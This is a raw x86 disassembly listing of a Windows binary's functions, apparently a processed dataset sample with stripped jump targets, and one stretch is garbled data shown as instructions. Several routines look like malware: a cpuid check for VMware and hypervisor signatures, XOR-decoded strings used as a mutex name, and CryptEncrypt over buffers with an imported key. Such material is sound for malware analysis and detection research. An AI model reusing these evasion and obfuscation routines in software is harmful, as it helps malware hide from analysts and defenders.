mov esp ebp
pop ebp
retn
sub_1006d08f
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
movsx eax [ ebp + 0x28 ]
push esi
mov esi [ ebp + 0x20 ]
push edi
xor edi edi
add eax 0xffffffbf
mov [ ebp - 0x4 ] edi
cmp eax 0x38
ja r-xdata
or [ esi ] 0x2
movzx eax [ eax + lookup_table_1006d37b ]
jmp [ eax * 4 + jump_table_1006d31f ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop edi
mov [ eax + 0x4 ] ecx
pop esi
leave
retn 0x28
or [ esi ] 0x1
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x10 ]
mov eax [ ebp - 0xc ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x8 ]
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0x14 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x14 ]
mov eax [ ebp - 0x14 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x10 ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x24 ]
lea eax [ ebp - 0x4 ]
push eax
push 0x63
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1001be36
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push r--data
lea eax [ ebp - 0x2c ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x8
push eax
push 0x17
mov eax [ ebp + 0x24 ]
add eax 0x8
push eax
push 0xb
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x1c
push eax
push 0x16e
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1001be36
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x4
push eax
push r--data
lea eax [ ebp - 0x34 ]
jmp r-xdata
push r--data
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1005f353
add esp 0x10
cmp eax edi
jl r-xdata
push r--data
lea eax [ ebp - 0x3c ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x44 ]
jmp r-xdata
push [ ebp + 0x24 ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x4c ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x1c
push eax
push 0x35
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x18
push eax
push 0x6
jmp r-xdata
push r--data
lea eax [ ebp - 0x54 ]
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x63
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1001be36
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x18 ]
mov eax [ ebp - 0x1c ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x18 ]
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0xffffffed
imul eax eax 0x64
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1006f199
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1001be36
add esp 0x18
or [ esi ] eax
jmp r-xdata
push edi
jmp r-xdata
push 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x24 ]
dec eax
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov ecx [ ebp + 0x24 ]
imul eax eax 0xc
add [ ecx + 0x8 ] eax
jmp r-xdata
push 0x3b
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax 0x45
jge r-xdata
mov ecx [ ebp + 0x24 ]
mov [ ecx + 0x14 ] eax
jmp r-xdata
add eax 0x64
jmp r-xdata
sub_1006d392
or [ ebx ] ecx
push ss
push ss
push ss
push ss
push ss
push ss
push ss
add [ ecx ] al
or al 0xd
or eax 0x16011616
push cs
push ss
push ss
movups xmm2 [ esi ]
adc [ esi ] edx
adc dl [ esi ]
adc [ esi ] dl
push ss
adc edx [ edx - 0x33333334 ]
int3
sub_1006d3c0
push ebp
mov ebp esp
xor eax eax
test ecx ecx
je r-xdata
mov eax 0x80070057
cmp ecx 0x7fffffff
jbe r-xdata
pop ebp
retn
push esi
push edi
lea esi [ ecx - 0x1 ]
mov ecx [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
push ecx
push esi
push ebx
xor edi edi
call sub_10069907
add esp 0x10
test eax eax
js r-xdata
test eax eax
js r-xdata
xor eax eax
mov [ ebx + esi * 2 ] ax
mov edi 0x8007007a
cmp eax esi
ja r-xdata
jne r-xdata
mov eax edi
pop edi
pop esi
xor edx edx
mov eax edi
pop edi
mov [ ebx + esi * 2 ] dx
pop esi
pop ebp
retn
sub_1006d41a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call sub_1005b670
push 0x16
pop esi
mov [ eax ] esi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_1007f8f0
add esp 0xc
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_1007f580
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_1005b670
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
call sub_1004b131
mov eax esi
jmp r-xdata
sub_1006d490
push ebp
mov ebp esp
push 0xffffffff
push sub_10086d3b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ecx ]
lea edi [ ecx + 0x60 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x10 ] edi
mov [ ecx + edi - 0x60 ] r--data
lea ecx [ edi - 0x48 ]
mov [ ebp - 0x4 ] 0x0
call sub_10018590
mov [ ebp - 0x4 ] 0xffffffff
mov edx [ edi - 0x60 ]
mov eax [ edx + 0x4 ]
mov [ eax + edi - 0x60 ] r--data
mov ecx [ edi - 0x50 ]
mov edx [ ecx + 0x4 ]
mov [ edx + edi - 0x50 ] r--data
mov eax [ edi - 0x60 ]
mov ecx [ eax + 0x4 ]
mov [ ecx + edi - 0x60 ] r--data
push edi
mov [ edi ] r--data
call sub_10027450
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_1006d528
mov edi edi
push ebp
mov ebp esp
jmp r-xdata
cmp [ ebp + 0x18 ] 0x0
ja r-xdata
mov eax [ ebp + 0x14 ]
movzx eax [ eax ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100176b0
dec [ ebp + 0x18 ]
add [ ebp + 0x14 ] 0x2
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
sub_1006d560
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
mov ecx [ edi ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] eax
call sub_10075bb0
xor esi esi
add esp 0x8
cmp [ edi + 0xc ] esi
jbe r-xdata
lea eax [ edi + 0x8 ]
push eax
lea ecx [ ebp - 0x10 ]
push ecx
call sub_1001cd60
lea edx [ ebp - 0x10 ]
push edi
push edx
call sub_1006db40
add esp 0x10
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ edi + 0x8 ]
mov ecx [ eax + esi * 4 ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
call sub_10066170
inc esi
add esp 0x8
cmp esi [ edi + 0xc ]
jb r-xdata
sub_1006d5c0
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov eax 0x40000000
cpuid
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0xc ]
pop ebx
cmp eax 0x61774d56
jne r-xdata
cmp eax 0x70726c20
jne r-xdata
cmp [ ebp - 0x4 ] 0x4d566572
jne r-xdata
xor eax eax
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x68797065
jne r-xdata
cmp [ ebp - 0x8 ] 0x65726177
jne r-xdata
cmp [ ebp - 0x8 ] 0x72762020
jne r-xdata
mov eax 0x1
mov esp ebp
pop ebp
retn
mov eax 0x1
mov esp ebp
pop ebp
retn
sub_1006d630
push ebp
mov ebp esp
and esp 0xffffffc0
sub esp 0xb4
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xb0 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
mov [ esp + 0x38 ] eax
mov eax [ ebx + 0x1c ]
xor edi edi
mov [ esp + 0x3c ] ecx
mov ecx [ ebx + 0x18 ]
cmp eax edi
jg r-xdata
mov esi ecx
jl r-xdata
mov [ esp + 0x34 ] esi
jg r-xdata
test [ ebx + 0x14 ] 0x2000
jne r-xdata
cmp ecx edi
ja r-xdata
fld [ ebp + 0x1c ]
fldz
fld [ ebp + 0x1c ]
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
mov [ esp + 0x34 ] 0x24
jmp r-xdata
cmp esi 0x24
jbe r-xdata
mov esi 0x6
xor eax eax
jmp r-xdata
test dl 0x10
je r-xdata
mov [ esp + 0x41 ] 0x2b
lea eax [ esp + 0x42 ]
mov [ esp + 0x2f ] 0x0
jmp r-xdata
mov [ esp + 0x2f ] 0x1
fchs
mov eax [ esp + 0x34 ]
cdq
sub esi eax
sbb ecx edx
mov edx [ ebx + 0x14 ]
mov eax edx
and eax 0x3000
mov [ esp + 0x30 ] edi
cmp eax 0x2000
jne r-xdata
mov ecx eax
cmp ecx edi
jl r-xdata
and edx 0x3000
mov [ eax ] 0x2a2e
mov [ eax + 0x2 ] 0x4c
cmp edx 0x2000
jne r-xdata
mov [ eax ] 0x23
inc eax
fld [ r--data ]
fcom st1
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp [ esp + 0x30 ] 0x1388
jae r-xdata
fstp st1
jmp r-xdata
cmp edx 0x3000
jne r-xdata
mov cl 0x66
jmp r-xdata
fdiv st2
add [ esp + 0x30 ] 0xa
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
cmp edx 0x1000
setne cl
lea ecx [ ecx + ecx + 0x65 ]
mov cl 0x61
jmp r-xdata
sub esp 0x8
mov [ eax + 0x3 ] cl
fstp [ esp ]
mov ecx [ esp + 0x3c ]
push ecx
lea edx [ esp + 0x4c ]
push edx
mov [ eax + 0x4 ] 0x0
lea eax [ esp + 0x58 ]
push 0x6c
push eax
call sub_1000f103
mov ecx [ esp + 0x48 ]
push eax
mov eax [ ebp + 0x18 ]
push esi
mov esi [ esp + 0x58 ]
push edi
push ecx
mov ecx [ ebp + 0x10 ]
lea edx [ esp + 0x70 ]
push edx
mov edx [ ebp + 0xc ]
push eax
mov eax [ esp + 0x6c ]
push ebx
push ecx
push edx
push esi
push eax
call sub_1003fad0
mov ecx [ esp + 0x100 ]
add esp 0x44
pop edi
mov eax esi
pop esi
pop ebx
xor ecx esp
call sub_10032529
mov esp ebp
pop ebp
retn 0x1c
fxch st1
fstp st0
cmp [ esp + 0x2f ] 0x0
fstp st1
je r-xdata
test ecx ecx
jl r-xdata
mov [ esp + 0x40 ] 0x25
lea eax [ esp + 0x41 ]
test dl 0x20
je r-xdata
fchs
jmp r-xdata
jg r-xdata
fld [ r--data ]
jmp r-xdata
cmp esi 0xa
jb r-xdata
fcom st1
fnstsw ax
test ah 0x1
jne r-xdata
fstp st0
jmp r-xdata
cmp edi 0x1388
jae r-xdata
add esi 0xfffffff6
fxch st1
adc ecx 0xffffffff
fmul st2
add edi 0xa
test ecx ecx
jg r-xdata
fxch st1
jl r-xdata
fstp st1
cmp esi 0xa
jae r-xdata
sub_1006d830
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
je r-xdata
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0x7
xor ecx ecx
mov [ esi + edi * 2 ] cx
pop edi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push ebx
mov ebx [ esi ]
test edi edi
je r-xdata
push ebx
call sub_1000a86e
add esp 0x4
pop ebx
lea eax [ edi + edi ]
push eax
push ebx
push esi
call sub_1007f580
add esp 0xc
sub_1006d880
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x71c71c7
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10032538
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_10055e2a
lea eax [ ecx + ecx * 8 ]
add eax eax
add eax eax
push eax
call sub_1002e3ac
add esp 0x4
test eax eax
jne r-xdata
sub_1006d8e0
mov eax [ esi ]
mov eax [ eax + 0x4 ]
push edi
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov eax esi
pop edi
retn
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
call sub_10039ae0
or eax 0x4
sub_1006d92a
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push ebx
push 0x1
push ebx
push ebx
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
push esi
push edi
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0xc ]
call [ CryptImportKey@IAT ]
test eax eax
jne r-xdata
inc eax
mov eax [ ebp + 0xc ]
push [ eax ]
mov esi [ ebp + 0x8 ]
mov edi [ CryptEncrypt@IAT ]
lea eax [ ebp - 0x8 ]
push eax
push [ esi ]
push ebx
push 0x1
push ebx
push [ ebp - 0x4 ]
call edi
test eax eax
jne r-xdata
push 0x2
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp - 0x4 ]
mov [ ecx ] eax
call [ CryptDestroyKey@IAT ]
xor esi esi
jmp r-xdata
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
pop ebx
leave
retn 0x10
push ebx
push [ ebp - 0xc ]
call [ CryptReleaseContext@IAT ]
pop edi
mov eax esi
pop esi
jmp r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x3
jmp r-xdata
push [ ebp - 0x8 ]
push [ esi ]
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
push [ ebp - 0x8 ]
mov [ esi ] eax
push [ ebp + 0xc ]
push eax
push ebx
push 0x1
push ebx
push [ ebp - 0x4 ]
call edi
test eax eax
jne r-xdata
pop esi
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x4
jmp r-xdata
sub_1006da10
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x10 ]
push ebx
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
cmp eax ecx
jae r-xdata
mov ebx [ ebp + 0x10 ]
sub eax ecx
cmp eax ebx
jae r-xdata
push r--data
call sub_100651be
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ebx eax
test ebx ebx
je r-xdata
push r--data
call sub_10030594
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
lea edi [ eax + ebx ]
cmp edi 0x7ffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_10030594
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_10071bf0
mov edx [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax 0x8
cmp [ edx + 0x14 ] eax
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x8
jb r-xdata
pop edi
mov ecx edx
mov ecx [ edx ]
jmp r-xdata
pop edi
mov eax esi
xor edx edx
pop esi
mov [ eax ] dx
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
xor edx edx
pop edi
mov [ eax ] dx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] eax
jb r-xdata
mov eax esi
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax [ esi ]
xor ecx ecx
mov [ eax + edi * 2 ] cx
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
lea edx [ ebx + ebx ]
push edx
mov edx [ ebp + 0xc ]
lea ecx [ ecx + edx * 2 ]
mov edx [ esi + 0x10 ]
push ecx
lea eax [ eax + edx * 2 ]
push eax
call sub_1007f580
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
sub_1006db12
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1000fcc7
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
pop ecx
sub_1006db40
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov ecx [ ebp + 0xc ]
mov edx [ eax + 0x8 ]
mov eax [ eax + 0x4 ]
push ecx
push edx
call eax
add esp 0x8
pop ebp
retn
sub_1006db5a
push 0x14
mov eax sub_100853dd
call sub_100259bb
mov esi ecx
mov [ ebp - 0x1c ] esi
call sub_1003d7d5
xor ebx ebx
mov edi eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0xc ] bl
je r-xdata
mov eax [ edi + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] r--data
jmp r-xdata
call sub_10008d33
retn 0x8
call sub_100575c5
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
push ebx
push 0x2e
mov [ ebp - 0x1c ] edx
call sub_10032181
mov [ esi + 0xc ] ax
call sub_100575c5
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
push ebx
push 0x2c
mov [ ebp - 0x1c ] edx
call sub_10032181
add esp 0x18
mov [ esi + 0xe ] ax
call sub_100575c5
lea eax [ ebp - 0x20 ]
push eax
push ebx
push [ ebp - 0x14 ]
call sub_10003340
add esp 0xc
mov [ esi + 0x8 ] eax
call sub_100575c5
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
push eax
push ebx
push r--data
mov [ ebp - 0x14 ] edx
call sub_1005912f
add esp 0xc
mov [ esi + 0x10 ] eax
call sub_100575c5
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
push eax
push ebx
push r--data
mov [ ebp - 0x14 ] edx
call sub_1005912f
add esp 0xc
mov [ esi + 0x14 ] eax
call sub_100575c5
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x1c ] edx
movzx eax [ eax ]
push ebx
push eax
call sub_10032181
mov [ esi + 0xc ] ax
call sub_100575c5
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0x1c ] edx
movzx eax [ eax ]
push ebx
push eax
call sub_10032181
add esp 0x18
mov [ esi + 0xe ] ax
cmp [ ebp + 0xc ] bl
je r-xdata
sub_1006dc90
push ebp
mov ebp esp
push 0xffffffff
push sub_10088c02
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ edi + 0x4 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov ebx [ edi + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
xor eax eax
mov [ ebp - 0x4 ] 0x1
cmp ebx eax
je r-xdata
mov ecx edi
call sub_1005a9c0
sub esi eax
mov eax 0x38e38e39
imul esi
sar edx 0x3
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x24
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0xffffffff
push eax
xor edx edx
mov [ ebx + 0x14 ] 0x7
mov [ ebx + 0x10 ] eax
push esi
mov ecx ebx
mov [ ebx ] dx
call sub_1002d970
mov eax [ esi + 0x1c ]
mov [ ebx + 0x1c ] eax
mov ecx [ esi + 0x20 ]
mov [ ebx + 0x20 ] ecx
mov ecx [ edi ]
lea eax [ esi + esi * 8 ]
mov esi [ edi + 0x4 ]
lea ebx [ ecx + eax * 4 ]
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] esi
xor eax eax
mov [ ebp - 0x4 ] eax
cmp esi eax
je r-xdata
mov ecx edi
call sub_1005a9c0
push 0xffffffff
push eax
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push ebx
mov ecx esi
mov [ esi ] dx
call sub_1002d970
mov eax [ ebx + 0x1c ]
mov [ esi + 0x1c ] eax
mov ecx [ ebx + 0x20 ]
mov [ esi + 0x20 ] ecx
jmp r-xdata
sub_1006dd84
push 0x10
push r--data
call sub_1007fad0
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1006de46
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_1002d269
inc [ eax + 0x90 ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_1007fb15
retn
call sub_10032da8
call sub_10032da8
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
mov ecx [ edi + 0x8 ]
mov esi [ ecx + eax * 8 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + eax * 8 + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax * 8 + 0x4 ]
call sub_10082060
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_1006de60
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0xc ]
cmp ecx 0x1
jne r-xdata
cmp [ eax + 0x14 ] 0x8
jb r-xdata
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov edx [ ebp + 0x8 ]
push edi
lea edi [ eax + edx * 2 ]
test ecx ecx
je r-xdata
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov dx [ ebp + 0x10 ]
mov [ eax + ecx * 2 ] dx
pop ebp
retn 0xc
mov eax [ eax ]
pop edi
pop ebp
retn 0xc
mov eax [ ebp + 0x10 ]
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
shr ecx 0x1
[ edi ]
adc ecx ecx
[ edi ]
sub_1006dec0
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + r--data ]
xor cl cl
cmp [ eax + 0x4 ] 0x0
jbe r-xdata
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] 0x0
retn
push esi
xor esi esi
mov edx [ eax ]
mov dl [ edx + esi ]
xor dl [ eax + 0x8 ]
xor dl cl
inc cl
mov [ esi + edi ] dl
movzx esi cl
cmp esi [ eax + 0x4 ]
jb r-xdata
mov eax [ eax + 0x4 ]
mov [ edi + eax ] 0x0
pop esi
retn
sub_1006df00
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x32
and edx 0xff
mov [ ebp + eax * 2 - 0x1c ] dx
inc eax
cmp eax 0xa
jb r-xdata
xor eax eax
lea ecx [ ebp - 0x1c ]
push ecx
push eax
push eax
mov [ ebp - 0x8 ] ax
call [ CreateMutexW@IAT ]
mov [ esi + 0x20 ] eax
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0xb7
jne r-xdata
lea edx [ ebp - 0x44 ]
mov eax 0x26
call sub_1002f620
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x4c ]
mov eax 0x40
mov [ edi ] 0x0
call sub_1002f620
mov edx [ esi + 0x20 ]
push 0xffffffff
push edx
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
ja r-xdata
lea edx [ ebp - 0x48 ]
mov eax 0xfd
call sub_1002f620
cmp eax 0xffffffff
je r-xdata
je r-xdata
lea edx [ ebp - 0x38 ]
mov eax 0x93
lea edx [ ebp - 0x74 ]
mov eax 0xf7
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax 0x65
jmp r-xdata
test eax eax
je r-xdata
call sub_1002f620
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x3c ]
mov eax 0xac
call sub_1002f620
mov [ edi ] 0x1
xor eax eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
cmp eax 0x80
jne r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0xb7
call sub_1002f620
mov [ edi ] 0x1
xor eax eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1006e040
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_1006e090
push ebp
mov ebp esp
push ecx
test esi esi
je r-xdata
mov eax 0x1
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push edi
lea edx [ ebp - 0x4 ]
mov eax 0x66
call sub_10069020
movzx ecx [ esi ]
or edi 0xffffffff
xor eax eax
test cx cx
je r-xdata
push esi
mov edx 0x7ffffffe
mov eax 0x104
mov ecx ebx
call sub_10072780
test eax eax
jns r-xdata
mov edx [ ebp - 0x4 ]
mov eax 0x50
mov eax 0x4
pop edi
mov esp ebp
pop ebp
retn
movzx ecx [ esi + eax * 2 + 0x2 ]
inc eax
